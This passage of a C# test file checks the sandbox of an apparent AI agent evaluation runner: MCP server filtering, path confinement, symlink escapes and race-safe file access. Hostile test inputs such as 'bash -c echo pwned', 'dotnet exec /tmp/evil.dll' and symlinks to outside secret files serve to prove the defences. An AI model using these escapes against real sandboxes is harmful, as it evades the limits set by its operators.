        Assert.IsTrue(config.McpServers.ContainsKey("ok"));
        var entry = (McpStdioServerConfig)config.McpServers["ok"];
        Assert.IsNotNull(entry.Env);
        Assert.IsFalse(entry.Env.ContainsKey("NODE_OPTIONS"));
        Assert.IsFalse(entry.Env.ContainsKey("PATH"));
        Assert.IsFalse(entry.Env.ContainsKey("MY_SETTING"));
        Assert.StartsWith(Path.GetTempPath(), entry.Env["NUGET_PACKAGES"]);
        Assert.StartsWith(Path.GetTempPath(), entry.Env["NUGET_HTTP_CACHE_PATH"]);
    }

    [TestMethod]
    public async Task DropsMcpCwd()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = SafeMcpServer(cwd: "/tmp/evil")
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
        var entry = (McpStdioServerConfig)config.McpServers["ok"];
        Assert.IsNull(entry.WorkingDirectory);
    }

    [TestMethod]
    public async Task FiltersOutDisallowedMcpServersButKeepsAllowed()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["good"] = SafeMcpServer(),
            ["bad"] = new MCPServerDef(Command: "bash", Args: ["-c", "echo pwned"], Tools: ["*"]),
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
        Assert.IsTrue(config.McpServers.ContainsKey("good"));
        Assert.IsFalse(config.McpServers.ContainsKey("bad"));
    }

    [TestMethod]
    public async Task RejectsMcpServerWithDangerousArgs()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["evil"] = new MCPServerDef(Command: "dotnet", Args: ["exec", "/tmp/evil.dll"], Tools: ["*"]),
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNull(config.McpServers);
    }

    [TestMethod]
    public async Task AllowsShippedBinlogMcpArgs()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = SafeMcpServer(),
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
        var entry = Assert.IsInstanceOfType<McpStdioServerConfig>(config.McpServers["ok"]);
        Assert.IsNotNull(entry.Args);
        Assert.Contains("Microsoft.AITools.BinlogMcp@3.0.2", entry.Args!);
        Assert.Contains("--no-http-cache", entry.Args);
        var configIndex = entry.Args.IndexOf("--configfile");
        Assert.IsTrue(configIndex >= 0);
        Assert.IsTrue(File.Exists(entry.Args[configIndex + 1]));
    }

    private static string FindRepositoryRoot(
        [System.Runtime.CompilerServices.CallerFilePath] string sourceFilePath = "")
    {
        return Path.GetFullPath(Path.Combine(
            Path.GetDirectoryName(sourceFilePath)!,
            "..",
            "..",
            "..",
            ".."));
    }

    [TestMethod]
    public async Task PluginRootWithoutPluginJsonFallsBackToEmptySkillDirs()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["test-mcp"] = SafeMcpServer(["t1"])
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, "/plugins/dotnet", "gpt-4.1", "C:\\tmp\\work", mcpServers);
        // When pluginRoot has no plugin.json, SkillDirectories falls back to empty
        Assert.IsEmpty(config.SkillDirectories!);
        // MCP servers are always passed through (no longer suppressed for plugin runs)
        Assert.IsNotNull(config.McpServers);
        Assert.IsTrue(config.McpServers.ContainsKey("test-mcp"));
    }

    [TestMethod]
    public async Task PluginRootWithPluginJsonResolvesSkillDirectories()
    {
        // Create a temp plugin structure
        var tempDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var skillsDir = Path.Combine(tempDir, "skills", "my-skill");
        Directory.CreateDirectory(skillsDir);
        File.WriteAllText(Path.Combine(skillsDir, "SKILL.md"), "---\nname: my-skill\n---\n# Test");
        File.WriteAllText(Path.Combine(tempDir, "plugin.json"),
            "{\"name\":\"test\",\"version\":\"1.0.0\",\"description\":\"Test plugin\",\"skills\":\"./skills/\"}");
        try
        {
            var config = await AgentRunner.BuildSessionConfig(MockSkill, tempDir, "gpt-4.1", "C:\\tmp\\work");
            Assert.ContainsSingle(config.SkillDirectories!);
            var stagedRoot = config.SkillDirectories![0];
            Assert.StartsWith(Path.GetTempPath(), stagedRoot);
            Assert.AreNotEqual(
                Path.GetFullPath(Path.Combine(tempDir, "skills")),
                Path.TrimEndingDirectorySeparator(stagedRoot));
            Assert.IsTrue(File.Exists(Path.Combine(stagedRoot, "my-skill", "SKILL.md")));
        }
        finally
        {
            Directory.Delete(tempDir, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task PluginRootNullPreservesSkillDirectories()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        // Without pluginRoot, SkillDirectories should contain the staged isolation dir
        Assert.ContainsSingle(config.SkillDirectories!);
        Assert.StartsWith(Path.GetTempPath(), config.SkillDirectories![0]);
    }

    [TestMethod]
    public async Task IsolatedAgentRegistersOnlyTargetAndDeclaredDependencies()
    {
        var target = new AgentInfo(
            "target-agent",
            "Target",
            "target.agent.md",
            "---\nname: target-agent\ndescription: Target\n---\nTarget prompt",
            "target.agent.md");
        var dependency = new AgentInfo(
            "dependency-agent",
            "Dependency",
            "dependency.agent.md",
            "---\nname: dependency-agent\ndescription: Dependency\n---\nDependency prompt",
            "dependency.agent.md");

        var config = await AgentRunner.BuildSessionConfig(
            skill: null,
            pluginRoot: null,
            model: "gpt-4.1",
            workDir: "C:\\tmp\\work",
            agent: target,
            additionalAgents: [dependency]);

        Assert.AreSequenceEqual(
            ["target-agent", "dependency-agent"],
            config.CustomAgents!.Select(agent => agent.Name));
    }

    [TestMethod]
    public async Task SetupWorkDirCopiesVallyDirectoryFixture()
    {
        var evalRoot = Path.Combine(Path.GetTempPath(), $"agent-fixture-{Guid.NewGuid():N}");
        var fixtureDir = Path.Combine(evalRoot, "fixtures", "project");
        Directory.CreateDirectory(fixtureDir);
        File.WriteAllText(Path.Combine(fixtureDir, "Project.csproj"), "<Project />");
        var evalPath = Path.Combine(evalRoot, "eval.yaml");
        File.WriteAllText(evalPath, "stimuli: []");
        try
        {
            var scenario = new EvalScenario(
                "Copy fixture",
                "Inspect it",
                Setup: new SetupConfig(
                    Files: [new SetupFile("Project", "fixtures/project")]));

            var workDir = await AgentRunner.SetupWorkDir(scenario, null, evalPath);

            Assert.IsTrue(File.Exists(Path.Combine(workDir, "Project", "Project.csproj")));
        }
        finally
        {
            Directory.Delete(evalRoot, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public void SetupCommandsInheritUnusedOutputStreams()
    {
        var psi = AgentRunner.CreateSetupProcessStartInfo("echo setup", Path.GetTempPath());

        Assert.IsFalse(psi.RedirectStandardOutput);
        Assert.IsFalse(psi.RedirectStandardError);
        Assert.IsFalse(psi.UseShellExecute);
    }

    [TestMethod]
    public void ResolveSourcePathAllowsSharedFixtureInsideRepository()
    {
        var repoRoot = Path.Combine(Path.GetTempPath(), $"shared-fixture-{Guid.NewGuid():N}");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var sharedDir = Path.Combine(repoRoot, "tests", "demo", "shared", "fixtures");
        Directory.CreateDirectory(evalDir);
        Directory.CreateDirectory(sharedDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        var evalPath = Path.Combine(evalDir, "eval.yaml");
        var source = Path.Combine(sharedDir, "input.txt");
        File.WriteAllText(evalPath, "stimuli: []");
        File.WriteAllText(source, "input");
        try
        {
            var resolved = AgentRunner.ResolveSourcePath(
                "../shared/fixtures/input.txt", evalPath, skillPath: null);

            Assert.AreEqual(Path.GetFullPath(source), resolved);
        }
        finally
        {
            Directory.Delete(repoRoot, true);
        }
    }

    [TestMethod]
    public void ResolveSourcePathRejectsFileSymlinkOutsideRepository()
    {
        var root = Path.Combine(Path.GetTempPath(), $"source-file-link-{Guid.NewGuid():N}");
        var repoRoot = Path.Combine(root, "repo");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var fixturesDir = Path.Combine(evalDir, "fixtures");
        var outsideFile = Path.Combine(root, "secret.txt");
        Directory.CreateDirectory(fixturesDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        File.WriteAllText(Path.Combine(evalDir, "eval.yaml"), "stimuli: []");
        File.WriteAllText(outsideFile, "secret");
        if (!SymlinkTestHelper.TryCreateFile(Path.Combine(fixturesDir, "secret.txt"), outsideFile))
        {
            Directory.Delete(root, true);
            return;
        }
        try
        {
            var resolved = AgentRunner.ResolveSourcePath(
                "fixtures/secret.txt", Path.Combine(evalDir, "eval.yaml"), skillPath: null);

            Assert.IsNull(resolved);
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public void ResolveSourcePathRejectsDirectorySymlinkComponentOutsideRepository()
    {
        var root = Path.Combine(Path.GetTempPath(), $"source-dir-link-{Guid.NewGuid():N}");
        var repoRoot = Path.Combine(root, "repo");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var fixturesDir = Path.Combine(evalDir, "fixtures");
        var outsideDir = Path.Combine(root, "outside");
        Directory.CreateDirectory(fixturesDir);
        Directory.CreateDirectory(outsideDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        File.WriteAllText(Path.Combine(evalDir, "eval.yaml"), "stimuli: []");
        File.WriteAllText(Path.Combine(outsideDir, "secret.txt"), "secret");
        if (!SymlinkTestHelper.TryCreateDirectory(Path.Combine(fixturesDir, "linked"), outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }
        try
        {
            var resolved = AgentRunner.ResolveSourcePath(
                "fixtures/linked/secret.txt", Path.Combine(evalDir, "eval.yaml"), skillPath: null);

            Assert.IsNull(resolved);
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SetupWorkDirSkipsExplicitDirectorySymlinkSource()
    {
        var root = Path.Combine(Path.GetTempPath(), $"setup-dir-link-{Guid.NewGuid():N}");
        var repoRoot = Path.Combine(root, "repo");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var fixturesDir = Path.Combine(evalDir, "fixtures");
        var outsideDir = Path.Combine(root, "outside");
        Directory.CreateDirectory(fixturesDir);
        Directory.CreateDirectory(outsideDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        var evalPath = Path.Combine(evalDir, "eval.yaml");
        File.WriteAllText(evalPath, "stimuli: []");
        File.WriteAllText(Path.Combine(outsideDir, "secret.txt"), "secret");
        if (!SymlinkTestHelper.TryCreateDirectory(Path.Combine(fixturesDir, "linked"), outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }
        try
        {
            var scenario = new EvalScenario(
                "Copy fixture",
                "Inspect it",
                Setup: new SetupConfig(
                    Files: [new SetupFile("Fixture", "fixtures/linked")]));

            var workDir = await AgentRunner.SetupWorkDir(scenario, null, evalPath);

            Assert.IsFalse(File.Exists(Path.Combine(workDir, "Fixture", "secret.txt")));
        }
        finally
        {
            Directory.Delete(root, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task SetupWorkDirSkipsTopLevelSymlinkWhenCopyingTestFiles()
    {
        var root = Path.Combine(Path.GetTempPath(), $"setup-top-link-{Guid.NewGuid():N}");
        var repoRoot = Path.Combine(root, "repo");
        var evalDir = Path.Combine(repoRoot, "tests", "demo", "agent.router");
        var outsideFile = Path.Combine(root, "secret.txt");
        Directory.CreateDirectory(evalDir);
        Directory.CreateDirectory(Path.Combine(repoRoot, "plugins"));
        var evalPath = Path.Combine(evalDir, "eval.yaml");
        File.WriteAllText(evalPath, "stimuli: []");
        File.WriteAllText(outsideFile, "secret");
        if (!SymlinkTestHelper.TryCreateFile(Path.Combine(evalDir, "secret-link.txt"), outsideFile))
        {
            Directory.Delete(root, true);
            return;
        }
        try
        {
            var scenario = new EvalScenario(
                "Copy fixtures",
                "Inspect them",
                Setup: new SetupConfig(CopyTestFiles: true));

            var workDir = await AgentRunner.SetupWorkDir(scenario, null, evalPath);

            Assert.IsFalse(File.Exists(Path.Combine(workDir, "secret-link.txt")));
        }
        finally
        {
            Directory.Delete(root, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task PluginAgentRunRegistersCompleteProductionSurface()
    {
        var pluginRoot = Path.Combine(Path.GetTempPath(), $"agent-plugin-{Guid.NewGuid():N}");
        var skillsDir = Path.Combine(pluginRoot, "skills", "helper-skill");
        var agentsDir = Path.Combine(pluginRoot, "agents");
        Directory.CreateDirectory(skillsDir);
        Directory.CreateDirectory(agentsDir);
        File.WriteAllText(Path.Combine(skillsDir, "SKILL.md"), """
            ---
            name: helper-skill
            description: Helps.
            ---
            Help.
            """);
        File.WriteAllText(Path.Combine(agentsDir, "target.agent.md"), """
            ---
            name: target
            description: Target.
            ---
            Target.
            """);
        File.WriteAllText(Path.Combine(agentsDir, "peer.agent.md"), """
            ---
            name: peer
            description: Peer.
            ---
            Peer.
            """);
        File.WriteAllText(Path.Combine(pluginRoot, "plugin.json"), """
            {
              "name": "demo",
              "version": "1.0.0",
              "description": "Demo",
              "skills": ["./skills/"],
              "agents": ["./agents/"]
            }
            """);
        try
        {
            var target = Assert.ContainsSingle((await AgentDiscovery.DiscoverAgentsInPlugin(pluginRoot)).Where(agent => agent.Name == "target"));
            var workDir = Path.Combine(
                AgentRunner.GetEvaluationRoot(),
                $"plugin-agent-work-{Guid.NewGuid():N}");

            var config = await AgentRunner.BuildSessionConfig(
                skill: null,
                pluginRoot: pluginRoot,
                model: "gpt-4.1",
                workDir: workDir,
                agent: target);

            Assert.AreSequenceEqual(
                ["peer", "target"],
                config.CustomAgents!.Select(agent => agent.Name).Order());
            var stagedRoot = config.SkillDirectories!.Single();
            Assert.StartsWith(Path.GetTempPath(), stagedRoot);
            Assert.IsTrue(File.Exists(Path.Combine(stagedRoot, "helper-skill", "SKILL.md")));

            var originalSkillPath = Path.Combine(skillsDir, "SKILL.md");
            var originalArgs = JsonDocument.Parse(
                JsonSerializer.Serialize(new { path = originalSkillPath })).RootElement;
            var originalDecision = await config.Hooks!.OnPreToolUse!(
                new PreToolUseHookInput { ToolName = "view", ToolArgs = originalArgs },
                null!);
            Assert.AreEqual("deny", originalDecision!.PermissionDecision);

            var stagedSkillPath = Path.Combine(stagedRoot, "helper-skill", "SKILL.md");
            var stagedArgs = JsonDocument.Parse(
                JsonSerializer.Serialize(new { path = stagedSkillPath })).RootElement;
            var stagedDecision = await config.Hooks.OnPreToolUse!(
                new PreToolUseHookInput { ToolName = "view", ToolArgs = stagedArgs },
                null!);
            Assert.AreEqual("allow", stagedDecision!.PermissionDecision);

            var shellDecision = await config.OnPermissionRequest!(
                new PermissionRequestShell
                {
                    CanOfferSessionApproval = false,
                    Commands = [],
                    FullCommandText = $"cat \"{originalSkillPath}\"",
                    HasWriteFileRedirection = false,
                    Intention = "Read original plugin source",
                    PossiblePaths = [originalSkillPath],
                    PossibleUrls = [],
                },
                null!);
            Assert.AreEqual("reject", shellDecision.Kind);
        }
        finally
        {
            Directory.Delete(pluginRoot, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task PluginModeStagesOnlySafeSkillTrees()
    {
        var root = Path.Combine(Path.GetTempPath(), $"plugin-skill-link-{Guid.NewGuid():N}");
        var pluginRoot = Path.Combine(root, "plugins", "demo");
        var skillsRoot = Path.Combine(pluginRoot, "skills");
        var safeSkill = Path.Combine(skillsRoot, "safe");
        var outsideSkill = Path.Combine(root, "outside", "linked");
        Directory.CreateDirectory(safeSkill);
        Directory.CreateDirectory(outsideSkill);
        File.WriteAllText(Path.Combine(safeSkill, "SKILL.md"), """
            ---
            name: safe
            description: Safe skill.
            ---
            Safe.
            """);
        File.WriteAllText(Path.Combine(outsideSkill, "SKILL.md"), """
            ---
            name: linked
            description: External skill.
            ---
            External.
            """);
        File.WriteAllText(Path.Combine(outsideSkill, "secret.txt"), "secret");
        File.WriteAllText(Path.Combine(pluginRoot, "plugin.json"), """
            {"name":"demo","version":"1.0.0","description":"Demo","skills":["./skills/"]}
            """);
        var linkedSkill = Path.Combine(skillsRoot, "linked");
        if (!SymlinkTestHelper.TryCreateDirectory(linkedSkill, outsideSkill))
        {
            Directory.Delete(root, true);
            return;
        }

        try
        {
            var config = await AgentRunner.BuildSessionConfig(
                MockSkill,
                pluginRoot,
                "gpt-4.1",
                Path.Combine(root, "work"));

            var stagedRoot = Assert.ContainsSingle(config.SkillDirectories!);
            Assert.IsTrue(File.Exists(Path.Combine(stagedRoot, "safe", "SKILL.md")));
            Assert.IsFalse(Directory.Exists(Path.Combine(stagedRoot, "linked")));
            Assert.IsFalse(AgentRunner.CheckPermission(
                Path.Combine(linkedSkill, "secret.txt"),
                Path.Combine(root, "work"),
                skillPath: null,
                log: null,
                pluginRoot: pluginRoot));
        }
        finally
        {
            Directory.Delete(root, true);
            await AgentRunner.CleanupWorkDirs();
        }
    }

    [TestMethod]
    public async Task PluginSkillRunRegistersOnlyDeclaredAgentDependencies()
    {
        var pluginRoot = Path.Combine(Path.GetTempPath(), $"skill-plugin-{Guid.NewGuid():N}");
        var skillDir = Path.Combine(pluginRoot, "skills", "target-skill");
        var agentsDir = Path.Combine(pluginRoot, "agents");
        Directory.CreateDirectory(skillDir);
        Directory.CreateDirectory(agentsDir);
        File.WriteAllText(Path.Combine(skillDir, "SKILL.md"), """
            ---
            name: target-skill
            description: Target skill.
            ---
            Target.
            """);
        File.WriteAllText(Path.Combine(agentsDir, "declared.agent.md"), """
            ---
            name: declared
            description: Declared dependency.
            ---
            Declared.
            """);
        File.WriteAllText(Path.Combine(agentsDir, "unrelated.agent.md"), """
            ---
            name: unrelated
            description: Unrelated plugin agent.
            ---
            Unrelated.
            """);
        File.WriteAllText(Path.Combine(pluginRoot, "plugin.json"), """
            {
              "name": "demo",
              "version": "1.0.0",
              "description": "Demo",
              "skills": ["./skills/"],
              "agents": ["./agents/"]
            }
            """);
        try
        {
            var targetSkill = Assert.ContainsSingle((await SkillDiscovery.DiscoverSkills(Path.Combine(pluginRoot, "skills"))).Where(skill => skill.Name == "target-skill"));
            var declaredAgent = Assert.ContainsSingle((await AgentDiscovery.DiscoverAgentsInPlugin(pluginRoot)).Where(agent => agent.Name == "declared"));

            var config = await AgentRunner.BuildSessionConfig(
                skill: targetSkill,
                pluginRoot: pluginRoot,
                model: "gpt-4.1",
                workDir: "C:\\tmp\\work",
                additionalAgents: [declaredAgent]);

            Assert.AreEqual("declared", Assert.ContainsSingle(config.CustomAgents!).Name);
        }
        finally
        {
            Directory.Delete(pluginRoot, true);
        }
    }
}

[TestClass]
public class RunEventBufferTests
{
    [TestMethod]
    public void ConcurrentRecordsPreserveEventsAndOutput()
    {
        const int eventCount = 10_000;
        var buffer = new RunEventBuffer();

        Parallel.For(0, eventCount, index =>
            buffer.Record("assistant.message_delta", (agentEvent, output) =>
            {
                agentEvent.Data["index"] = JsonValue.Create(index);
                output.Append('x');
            }));

        var (events, output) = buffer.Snapshot();

        Assert.AreEqual(eventCount, events.Count);
        Assert.AreEqual(eventCount, output.Length);
        Assert.AreEqual(
            eventCount,
            events.Select(agentEvent => agentEvent.Data["index"]!.GetValue<int>())
                .Distinct()
                .Count());
    }
}

[TestClass]
public class ExtractPathsFromToolArgsTests
{
    private static PreToolUseHookInput MakeInput(JsonElement? toolArgs, string? toolName = null) =>
        new() { ToolArgs = toolArgs, ToolName = toolName ?? string.Empty };

    [TestMethod]
    public void ExtractsPathKey()
    {
        var args = JsonDocument.Parse("""{"path": "/tmp/work/file.txt"}""").RootElement;
        var result = AgentRunner.ExtractPathsFromToolArgs(MakeInput(args));
        Assert.AreSequenceEqual(["/tmp/work/file.txt"], result);
    }

    [TestMethod]
    public void ExtractsFileNameKey()
    {
        var args = JsonDocument.Parse("""{"fileName": "src/Program.cs"}""").RootElement;
        var result = AgentRunner.ExtractPathsFromToolArgs(MakeInput(args));
        Assert.AreSequenceEqual(["src/Program.cs"], result);
    }

    [TestMethod]
    public void IgnoresFullCommandText()
    {
        var args = JsonDocument.Parse("""{"fullCommandText": "dotnet build"}""").RootElement;
        var result = AgentRunner.ExtractPathsFromToolArgs(MakeInput(args));
        Assert.IsEmpty(result);
    }

    [TestMethod]
    public void ExtractsEveryKnownPath()
    {
        var args = JsonDocument.Parse("""{"path": "/p", "source": "a.txt", "destination": "b.txt", "paths": ["c.txt", "d.txt"]}""").RootElement;
        var result = AgentRunner.ExtractPathsFromToolArgs(MakeInput(args, "rename"));
        Assert.AreSequenceEqual(["/p", "a.txt", "b.txt", "c.txt", "d.txt"], result.OrderBy(path => path, StringComparer.Ordinal));
    }

    [TestMethod]
    public void ReturnsNullWhenToolArgsIsNull()
    {
        var result = AgentRunner.ExtractPathsFromToolArgs(MakeInput(null));
        Assert.IsEmpty(result);
    }

    [TestMethod]
    public void ReturnsNullWhenToolArgsIsNotObject()
    {
        var args = JsonDocument.Parse("""42""").RootElement;
        var result = AgentRunner.ExtractPathsFromToolArgs(MakeInput(args));
        Assert.IsEmpty(result);
    }

    [TestMethod]
    public void ReturnsNullWhenNoKnownKeysPresent()
    {
        var args = JsonDocument.Parse("""{"content": "hello", "other": 123}""").RootElement;
        var result = AgentRunner.ExtractPathsFromToolArgs(MakeInput(args));
        Assert.IsEmpty(result);
    }

    [TestMethod]
    public void ReturnsNullWhenKeyIsNotString()
    {
        var args = JsonDocument.Parse("""{"path": 42}""").RootElement;
        var result = AgentRunner.ExtractPathsFromToolArgs(MakeInput(args));
        Assert.IsEmpty(result);
    }
}

[TestClass]
public class LocalSessionFsHandlerTests
{
    public TestContext TestContext { get; set; } = null!;

    [TestMethod]
    public void ResolvesStateWorkspaceAndStagedPathsSeparately()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-{Guid.NewGuid():N}");
        var stateRoot = Path.Combine(root, "config");
        var workDir = Path.Combine(root, "work");
        var stagedDir = Path.Combine(root, "staged");
        Directory.CreateDirectory(stagedDir);

        try
        {
            var handler = new LocalSessionFsHandler(stateRoot, workDir, [workDir, stagedDir]);

            Assert.AreEqual(
                Path.Combine(stateRoot, "session-state", "events.jsonl"),
                handler.ResolvePath(Path.Combine("session-state", "events.jsonl")));
            Assert.AreEqual(
                Path.Combine(workDir, "src", "Program.cs"),
                handler.ResolvePath(Path.Combine("src", "Program.cs")));
            Assert.AreEqual(
                Path.Combine(stagedDir, "SKILL.md"),
                handler.ResolvePath(Path.Combine(stagedDir, "SKILL.md")));
            Assert.ThrowsExactly<UnauthorizedAccessException>(
                () => handler.ResolvePath(Path.Combine(root, "other-scenario", "secret.txt")));
            Assert.ThrowsExactly<UnauthorizedAccessException>(
                () => handler.ResolvePath(Path.Combine(root, "..", "outside.txt")));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public void RejectsWorkspaceSymlinkThatEscapesAllowedRoot()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-link-{Guid.NewGuid():N}");
        var allowedRoot = Path.Combine(root, "allowed");
        var stateRoot = Path.Combine(allowedRoot, "config");
        var workDir = Path.Combine(allowedRoot, "work");
        var outsideDir = Path.Combine(root, "outside");
        Directory.CreateDirectory(workDir);
        Directory.CreateDirectory(outsideDir);
        File.WriteAllText(Path.Combine(outsideDir, "secret.txt"), "secret");
        var link = Path.Combine(workDir, "linked");
        if (!SymlinkTestHelper.TryCreateDirectory(link, outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }

        try
        {
            var handler = new LocalSessionFsHandler(stateRoot, workDir, [workDir]);

            Assert.ThrowsExactly<UnauthorizedAccessException>(
                () => handler.ResolvePath(Path.Combine("linked", "secret.txt")));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SecureWriteRejectsSymlinkCreatedAfterPathResolution()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-write-race-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        var stateRoot = Path.Combine(root, "state");
        var outsideDir = Path.Combine(root, "outside");
        Directory.CreateDirectory(workDir);
        Directory.CreateDirectory(outsideDir);
        var link = Path.Combine(workDir, "linked");
        var handler = new LocalSessionFsHandler(stateRoot, workDir, [workDir]);
        var target = handler.ResolvePath(Path.Combine("linked", "escaped.txt"));
        if (!SymlinkTestHelper.TryCreateDirectory(link, outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }

        try
        {
            await Assert.ThrowsExactlyAsync<UnauthorizedAccessException>(() =>
                SecureFileSystem.WriteAllTextAsync(
                    workDir,
                    target,
                    "blocked",
                    append: false,
                    TestContext.CancellationToken));
            Assert.IsFalse(File.Exists(Path.Combine(outsideDir, "escaped.txt")));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SecureWriteCreatesAndAppendsToNewNestedFile()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-write-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        Directory.CreateDirectory(workDir);
        var target = Path.Combine(workDir, "new", "nested", "events.jsonl");

        try
        {
            await SecureFileSystem.WriteAllTextAsync(
                workDir,
                target,
                "first",
                append: false,
                TestContext.CancellationToken);
            await SecureFileSystem.WriteAllTextAsync(
                workDir,
                target,
                "-second",
                append: true,
                TestContext.CancellationToken);

            Assert.AreEqual("first-second", await File.ReadAllTextAsync(target, TestContext.CancellationToken));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SecureWriteRejectsInvalidUtf16()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-encoding-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        Directory.CreateDirectory(workDir);

        try
        {
            await Assert.ThrowsExactlyAsync<EncoderFallbackException>(() =>
                SecureFileSystem.WriteAllTextAsync(
                    workDir,
                    Path.Combine(workDir, "invalid.txt"),
                    "\uD800",
                    append: false,
                    TestContext.CancellationToken));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SecureWriteCannotBeRedirectedAfterParentIsOpened()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-open-race-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        var parent = Path.Combine(workDir, "parent");
        var outsideDir = Path.Combine(root, "outside");
        Directory.CreateDirectory(parent);
        Directory.CreateDirectory(outsideDir);
        var attemptedReplacement = false;
        var replacementCreated = false;
        var replacementBlocked = false;
        var probe = Path.Combine(workDir, "symlink-probe");
        if (!SymlinkTestHelper.TryCreateDirectory(probe, outsideDir))
        {
            Directory.Delete(root, true);
            return;
        }
        Directory.Delete(probe);

        try
        {
            try
            {
                await SecureFileSystem.WriteAllTextAsync(
                    workDir,
                    Path.Combine(parent, "safe.txt"),
                    "safe",
                    append: false,
                    TestContext.CancellationToken,
                    beforeLeafOpen: () =>
                    {
                        attemptedReplacement = true;
                        try
                        {
                            Directory.Delete(parent);
                            Directory.CreateSymbolicLink(parent, outsideDir);
                            replacementCreated = true;
                        }
                        catch (IOException) when (Directory.Exists(parent))
                        {
                            // A pinned directory may reject namespace replacement.
                            replacementBlocked = true;
                        }
                        catch (UnauthorizedAccessException) when (Directory.Exists(parent))
                        {
                            // Sharing violations can be reported as access failures.
                            replacementBlocked = true;
                        }
                    });
            }
            catch (UnauthorizedAccessException)
            {
                // A namespace replacement may make the anchored directory unusable;
                // failing the write is safe as long as it cannot escape the root.
            }
            catch (IOException)
            {
                // Unix can report the unlinked anchored directory as not found.
            }

            Assert.IsTrue(attemptedReplacement);
            Assert.IsTrue(replacementCreated || replacementBlocked);
            if (replacementCreated)
                Assert.IsTrue((File.GetAttributes(parent) & FileAttributes.ReparsePoint) != 0);
            Assert.IsFalse(File.Exists(Path.Combine(outsideDir, "safe.txt")));
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SecureReadRejectsLeafSymlinkReplacement()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-read-leaf-race-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        var outsideFile = Path.Combine(root, "secret.txt");
        var target = Path.Combine(workDir, "data.txt");
        Directory.CreateDirectory(workDir);
        File.WriteAllText(target, "safe");
        File.WriteAllText(outsideFile, "secret");
        var probe = Path.Combine(workDir, "symlink-probe");
        if (!SymlinkTestHelper.TryCreateFile(probe, outsideFile))
        {
            Directory.Delete(root, true);
            return;
        }
        File.Delete(probe);
        var replaced = false;

        try
        {
            await Assert.ThrowsExactlyAsync<UnauthorizedAccessException>(() =>
                SecureFileSystem.ReadAllTextAsync(
                    workDir,
                    target,
                    TestContext.CancellationToken,
                    beforeLeafOpen: () =>
                    {
                        File.Delete(target);
                        File.CreateSymbolicLink(target, outsideFile);
                        replaced = true;
                    }));

            Assert.IsTrue(replaced);
        }
        finally
        {
            Directory.Delete(root, true);
        }
    }

    [TestMethod]
    public async Task SecureReadCannotBeRedirectedAfterParentIsOpened()
    {
        var root = Path.Combine(Path.GetTempPath(), $"session-fs-read-parent-race-{Guid.NewGuid():N}");
        var workDir = Path.Combine(root, "work");
        var parent = Path.Combine(workDir, "parent");
        var movedParent = Path.Combine(workDir, "moved-parent");
        var outsideDir = Path.Combine(root, "outside");
        Directory.CreateDirectory(parent);
        Directory.CreateDirectory(outsideDir);
        File.WriteAllText(Path.Combine(parent, "data.txt"), "safe");
